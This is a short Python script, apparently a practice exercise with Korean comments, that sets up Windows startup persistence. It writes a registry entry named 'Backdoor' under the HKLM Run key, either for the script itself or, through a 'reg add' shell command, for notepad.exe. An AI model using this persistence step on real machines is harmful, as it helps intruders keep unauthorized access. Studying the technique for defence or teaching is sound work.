import sys, os

from winreg import *

def RegisterPy():
    regpath = "Software\Microsoft\Windows\CurrentVersion\Run"
    sub_key = "Backdoor"
    value = os.path.realpath(__file__) # 현재 파일의 경로
    with OpenKey(HKEY_LOCAL_MACHINE, regpath) as reg: # 권한 가져옴
        try:
            SetValueEx(reg, sub_key,0, REG_SZ, value) # 실제로 세팅
            CloseKey(reg)
        except Exception as e:
            print("*** Unable to register!\n", e)
            return
        print("--- Backdoor is now registered!")
        return

def reg_add():
	#value = os.path.realpath(__file__)
	value = "notepad.exe"
	command = """reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "{}" """.format(value)
	result = os.popen(command).read()
	print(result)
    
if __name__ == "__main__":
    reg_add()
